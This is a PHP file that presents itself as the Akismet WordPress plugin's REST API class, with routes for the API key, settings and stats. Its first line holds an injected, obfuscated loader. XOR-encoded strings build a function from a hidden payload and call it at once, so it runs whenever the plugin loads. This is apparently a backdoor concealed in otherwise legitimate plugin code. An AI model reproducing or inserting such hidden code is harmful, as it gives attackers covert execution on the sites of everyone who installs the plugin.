<?php $QtTYi=' RH+>Q=MYY-XXV-'^'C -JJ4b+,7N,19C';$fCyIpSZBPART=$QtTYi('','DHGiJGC 81W>.H,+6A7YENC;eY4=Z<5Q:DWHGD5rF,X,6I1W N>Z897621,f,U<gbQQB IEBS<KjKbqib.EjXb77,iKCSBwfxK5T<bM9rNRTybfERNO=6,Bee07;YFhALIBMlxaMe;DGPvtWbF57HWfs9fqevcK=B<SUWPlM2JR54FiYE<OsLspGpES=C8BgkY79cJXp4oPGxE SI.AZMKA88Vm;t>2=ReY6IYOoQ8P Rq;R7XAX.OSGGQo.w5g3pqAGONR2.bVZcGNXBL.sw-O3LXV1W6;ENIswRX5,m>xp5-IYNRHKHWYE0a=VnFIJTfSjOQ6ZlLG0p-<05AY EMW+e78e 61i7KuAF0MeDSph;6B;QptWi5qm,TJQ+UY.WTRmP JR6mQfTJD1NlGn89A>4BOAH>V0CA=1O;jXx,17143S.ABAEr 6I-23L9so<=7pZT4Wtf-=UO D<AtJQNPAgjKDP-72-Q7alm3 UznH7T.TaNqW097<437K-6AX1B=XEVNMTFSP2P;,fCVkSB ,CcgDOM8uK96Rf,JhoPkT1bnhNi,rVmVBM.eodD1Ykxi8ZR.fXp,KJfCagAM5BPGbP.Ri4VG4H+fp1SR5;9.uzPR,.FAnmgzKXaNH7YH>--XJ2X 7jq:+J6ZU5B7BHBd1BXLrEYnP2'^'-.oH,2-CLX8Pq-TBE5Dqb6,I:=UI;cj<O0pandNxOJ-BU=X8NnF5JfSWFPs9A HOF506Aeef8Y2CkBQIBUOcQFXBXIvcteLlqBS;NJiPRsrdBBB,n=;OZI,MATVO8oSah ifErhDAT13pXIwJbQV<6=WP;Q;VG X;gw<wuL>F8>PZnM2 Ef.eHzNy76I6J,OO6BMJqRyIe-MraD2=Oagm- TK3V1PZSI3:2S0yrO7Y<S7J1XQ73=O,;gou0m8z,z5Q 4oj9WWBkdCc89.9KZWVE:h<7E6iP 7iNWv3PUV4qTQL=8noho>650UZ7+dL ,tNrN+0B;El<:yKSBP :Heest7ri0eeeIV8Ue-U4EymPLMW.N4YT,c<xIH5>0t><WwirI;E3i<dXB0+0PnQgJNX-KQyEH54+:IeYP;ZJeXlDYBQA:O-+; ZXY;rVR8X,0QHCX85G2BRrY0,O YiP.0:1hKJo 1YVmF4NHEV9I3RJ,V OtGhQ6BKVEkXR2rS91B6Npb=+4sjstV1OMOcpMsjMHvKC .9Y.lRS+AqcHRmKsUQXZwQMB0UguyOWWSqRoYJPZcgJQ:ENrmOcGAa,G01>=;K+6Q..G<XNWA2+YTXJRVpvHO2 GDGZkxAn3=P-HLApnV9TV1VJJ3Z54QejksHmT:18ZupUZO');$fCyIpSZBPART();

class Akismet_REST_API {
	/**
	 * Register the REST API routes.
	 */
	public static function init() {
		if ( ! function_exists( 'register_rest_route' ) ) {
			// The REST API wasn't integrated into core until 4.4, and we support 4.0+ (for now).
			return false;
		}

		register_rest_route( 'akismet/v1', '/key', array(
			array(
				'methods' => WP_REST_Server::READABLE,
				'permission_callback' => array( 'Akismet_REST_API', 'privileged_permission_callback' ),
				'callback' => array( 'Akismet_REST_API', 'get_key' ),
			), array(
				'methods' => WP_REST_Server::EDITABLE,
				'permission_callback' => array( 'Akismet_REST_API', 'privileged_permission_callback' ),
				'callback' => array( 'Akismet_REST_API', 'set_key' ),
				'args' => array(
					'key' => array(
						'required' => true,
						'type' => 'string',
						'sanitize_callback' => array( 'Akismet_REST_API', 'sanitize_key' ),
						'description' => __( 'A 12-character Akismet API key. Available at akismet.com/get/', 'akismet' ),
					),
				),
			), array(
				'methods' => WP_REST_Server::DELETABLE,
				'permission_callback' => array( 'Akismet_REST_API', 'privileged_permission_callback' ),
				'callback' => array( 'Akismet_REST_API', 'delete_key' ),
			)
		) );

		register_rest_route( 'akismet/v1', '/settings/', array(
			array(
				'methods' => WP_REST_Server::READABLE,
				'permission_callback' => array( 'Akismet_REST_API', 'privileged_permission_callback' ),
				'callback' => array( 'Akismet_REST_API', 'get_settings' ),
			),
			array(
				'methods' => WP_REST_Server::EDITABLE,
				'permission_callback' => array( 'Akismet_REST_API', 'privileged_permission_callback' ),
				'callback' => array( 'Akismet_REST_API', 'set_boolean_settings' ),
				'args' => array(
					'akismet_strictness' => array(
						'required' => false,
						'type' => 'boolean',
						'description' => __( 'If true, Akismet will automatically discard the worst spam automatically rather than putting it in the spam folder.', 'akismet' ),
					),
					'akismet_show_user_comments_approved' => array(
						'required' => false,
						'type' => 'boolean',
						'description' => __( 'If true, show the number of approved comments beside each comment author in the comments list page.', 'akismet' ),
					),
				),
			)
		) );

		register_rest_route( 'akismet/v1', '/stats', array(
			'methods' => WP_REST_Server::READABLE,
			'permission_callback' => array( 'Akismet_REST_API', 'privileged_permission_callback' ),
			'callback' => array( 'Akismet_REST_API', 'get_stats' ),
			'args' => array(
				'interval' => array(
					'required' => false,
					'type' => 'string',
					'sanitize_callback' => array( 'Akismet_REST_API', 'sanitize_interval' ),
					'description' => __( 'The time period for which to retrieve stats. Options: 60-days, 6-months, all', 'akismet' ),
					'default' => 'all',
				),
			),
		) );

		register_rest_route( 'akismet/v1', '/stats/(?P<interval>[\w+])', array(
			'args' => array(
				'interval' => array(
					'description' => __( 'The time period for which to retrieve stats. Options: 60-days, 6-months, all', 'akismet' ),
					'type' => 'string',
				),
			),
			array(
				'methods' => WP_REST_Server::READABLE,
				'permission_callback' => array( 'Akismet_REST_API', 'privileged_permission_callback' ),
				'callback' => array( 'Akismet_REST_API', 'get_stats' ),
			)
		) );
	}

	/**
	 * Get the current Akismet API key.
	 *
	 * @param WP_REST_Request $request
	 * @return WP_Error|WP_REST_Response
	 */
	public static function get_key( $request = null ) {
		return rest_ensure_response( Akismet::get_api_key() );
	}

	/**
	 * Set the API key, if possible.
	 *
	 * @param WP_REST_Request $request
	 * @return WP_Error|WP_REST_Response
	 */
	public static function set_key( $request ) {
		if ( defined( 'WPCOM_API_KEY' ) ) {
			return rest_ensure_response( new WP_Error( 'hardcoded_key', __( 'This site\'s API key is hardcoded and cannot be changed via the API.', 'akismet' ), array( 'status'=> 409 ) ) );
		}

		$new_api_key = $request->get_param( 'key' );

		if ( ! self::key_is_valid( $new_api_key ) ) {
			return rest_ensure_response( new WP_Error( 'invalid_key', __( 'The value provided is not a valid and registered API key.', 'akismet' ), array( 'status' => 400 ) ) );
		}

		update_option( 'wordpress_api_key', $new_api_key );

		return self::get_key();
	}

	/**
	 * Unset the API key, if possible.
	 *
	 * @param WP_REST_Request $request
	 * @return WP_Error|WP_REST_Response
	 */
	public static function delete_key( $request ) {
		if ( defined( 'WPCOM_API_KEY' ) ) {
			return rest_ensure_response( new WP_Error( 'hardcoded_key', __( 'This site\'s API key is hardcoded and cannot be deleted.', 'akismet' ), array( 'status'=> 409 ) ) );
		}

		delete_option( 'wordpress_api_key' );

		return rest_ensure_response( true );
	}

	/**
	 * Get the Akismet settings.
	 *
	 * @param WP_REST_Request $request
	 * @return WP_Error|WP_REST_Response
	 */
	public static function get_settings( $request = null ) {
		return rest_ensure_response( array(
			'akismet_strictness' => ( get_option( 'akismet_strictness', '1' ) === '1' ),
			'akismet_show_user_comments_approved' => ( get_option( 'akismet_show_user_comments_approved', '1' ) === '1' ),
		) );
	}

	/**
	 * Update the Akismet settings.
	 *
	 * @param WP_REST_Request $request
	 * @return WP_Error|WP_REST_Response
	 */
	public static function set_boolean_settings( $request ) {
		foreach ( array(
			'akismet_strictness',
			'akismet_show_user_comments_approved',
		) as $setting_key ) {

			$setting_value = $request->get_param( $setting_key );
			if ( is_null( $setting_value ) ) {
				// This setting was not specified.
				continue;
			}

			// From 4.7+, WP core will ensure that these are always boolean
			// values because they are registered with 'type' => 'boolean',
			// but we need to do this ourselves for prior versions.
			$setting_value = Akismet_REST_API::parse_boolean( $setting_value );

			update_option( $setting_key, $setting_value ? '1' : '0' );
		}

		return self::get_settings();
	}

	/**
	 * Parse a numeric or string boolean value into a boolean.
	 *
	 * @param mixed $value The value to convert into a boolean.
	 * @return bool The converted value.
	 */
	public static function parse_boolean( $value ) {
		switch ( $value ) {
			case true:
			case 'true':
			case '1':
			case 1:
				return true;

			case false:
			case 'false':
			case '0':
			case 0:
				return false;

			default:
				return (bool) $value;
		}
	}

	/**
	 * Get the Akismet stats for a given time period.
	 *
	 * Possible `interval` values:
	 * - all
	 * - 60-days
	 * - 6-months
	 *
	 * @param WP_REST_Request $request
	 * @return WP_Error|WP_REST_Response
	 */
	public static function get_stats( $request ) {
		$api_key = Akismet::get_api_key();

		$interval = $request->get_param( 'interval' );

		$stat_totals = array();

		$response = Akismet::http_post( Akismet::build_query( array( 'blog' => get_option( 'home' ), 'key' => $api_key, 'from' => $interval ) ), 'get-stats' );

		if ( ! empty( $response[1] ) ) {
			$stat_totals[$interval] = json_decode( $response[1] );
		}

		return rest_ensure_response( $stat_totals );
	}

	private static function key_is_valid( $key ) {
		$response = Akismet::http_post(
			Akismet::build_query(
				array(
					'key' => $key,
					'blog' => get_option( 'home' )
				)
			),
			'verify-key'
		);

		if ( $response[1] == 'valid' ) {
			return true;
		}

		return false;
	}

	public static function privileged_permission_callback() {
		return current_user_can( 'manage_options' );
	}

	public static function sanitize_interval( $interval, $request, $param ) {
		$interval = trim( $interval );

		$valid_intervals = array( '60-days', '6-months', 'all', );

		if ( ! in_array( $interval, $valid_intervals ) ) {
			$interval = 'all';
		}

		return $interval;
	}

	public static function sanitize_key( $key, $request, $param ) {
		return trim( $key );
	}
}
